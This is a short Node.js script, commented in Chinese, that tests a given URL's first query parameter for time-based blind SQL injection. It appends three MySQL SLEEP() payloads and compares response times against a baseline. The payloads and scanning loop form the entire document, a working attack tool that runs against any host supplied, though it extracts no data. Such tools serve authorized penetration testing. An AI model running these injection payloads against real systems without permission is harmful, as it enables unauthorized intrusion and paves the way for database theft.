#!/usr/bin/env node
/**
 * sqli-time.mjs — 时间盲注存在性验证（只读、低频、默认 3 秒）
 * 用法: node sqli-time.mjs "https://HOST/path?param=1" [delay=3] [rounds=3]
 * 说明: 仅添加 AND SLEEP() 比较基线耗时，不读取任何数据。
 */
const [,, target, delayArg, roundsArg] = process.argv;
if (!target) { console.error('usage: node sqli-time.mjs "URL" [delay] [rounds]'); process.exit(1); }
const DELAY = Number(delayArg || 3);
const ROUNDS = Number(roundsArg || 3);

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function timeOnce(url) {
  const t0 = Date.now();
  let status = 0;
  try {
    const res = await fetch(url, { redirect: 'manual' });
    status = res.status;
    await res.text();
  } catch { status = -1; }
  return { ms: Date.now() - t0, status };
}

const payloads = [
  (u) => u.replace(/([?&][^=&]+=)([^&]*)/, (m, k, v) => k + encodeURIComponent(String(v) + "' AND SLEEP(" + DELAY + ") AND '1'='1")),
  (u) => u.replace(/([?&][^=&]+=)([^&]*)/, (m, k, v) => k + encodeURIComponent(String(v) + "' OR SLEEP(" + DELAY + ")#")),
  (u) => u.replace(/([?&][^=&]+=)([^&]*)/, (m, k, v) => k + encodeURIComponent(String(v) + " AND SLEEP(" + DELAY + ")")),
];

const base = [];
for (let i = 0; i < ROUNDS; i++) { base.push(await timeOnce(target)); await sleep(300); }
const baseAvg = base.reduce((s, x) => s + x.ms, 0) / base.length;
console.log('[*] baseline: ' + base.map(x => x.ms + 'ms').join(', ') + '  avg=' + baseAvg.toFixed(0) + 'ms');

let hit = false;
for (let i = 0; i < payloads.length; i++) {
  const u = payloads[i](target);
  const samples = [];
  for (let r = 0; r < ROUNDS; r++) { samples.push((await timeOnce(u)).ms); await sleep(300); }
  const avg = samples.reduce((s, x) => s + x, 0) / samples.length;
  const delta = avg - baseAvg;
  const verdict = delta > DELAY * 1000 * 0.7 ? 'SUSPECTED INJECTION' : 'no-signal';
  console.log('[' + (i + 1) + '] avg=' + avg.toFixed(0) + 'ms  delta=' + delta.toFixed(0) + 'ms  -> ' + verdict);
  console.log('     ' + u);
  if (delta > DELAY * 1000 * 0.7) hit = true;
}
console.log(hit ? '\n[+] time-based signal detected (verify manually, do not extract data)' : '\n[-] no time-based signal');
